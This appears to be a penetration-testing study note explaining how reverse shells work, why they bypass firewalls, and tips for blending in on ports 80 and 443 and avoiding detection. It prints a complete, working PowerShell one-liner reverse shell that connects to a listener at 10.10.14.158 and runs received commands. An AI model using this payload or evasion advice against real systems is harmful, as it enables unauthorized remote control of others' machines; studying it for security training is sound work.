# Reverse Shells

## Overview

A reverse shell works opposite to a bind shell.

The attacker:
- Starts a listener

The target:
- Initiates the connection back to the attacker

```text
Target  --->  Attacker Listener
```

---

# Why Reverse Shells Are Common

Reverse shells are more practical because:
- Outbound traffic is usually allowed
- Firewalls commonly block inbound traffic
- Easier to bypass NAT/firewall restrictions

Attackers often use common outbound ports like:
- `80`
- `443`

to blend in with normal traffic.

# Reverse Shell Payload

## Windows PowerShell Reverse Shell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

# What This Payload Does

- Creates a TCP connection to attacker
- Opens PowerShell
- Sends command output back through socket
- Allows remote command execution

# Key Points

- Attacker listens, target connects back
- Easier to bypass firewalls than bind shells
- Common outbound ports:
  - 80
  - 443
- PowerShell commonly used on Windows
- AV may detect reverse shell payloads

---

# Important Notes

- Reverse shells are commonly monitored by EDR/AV
- Deep packet inspection may still detect shells
- Using native tools helps avoid detection
- Netcat is not native to Windows

# One-Line Revision

A reverse shell makes the target connect back to the attacker’s listener, allowing remote command execution while bypassing many inbound firewall restrictions.
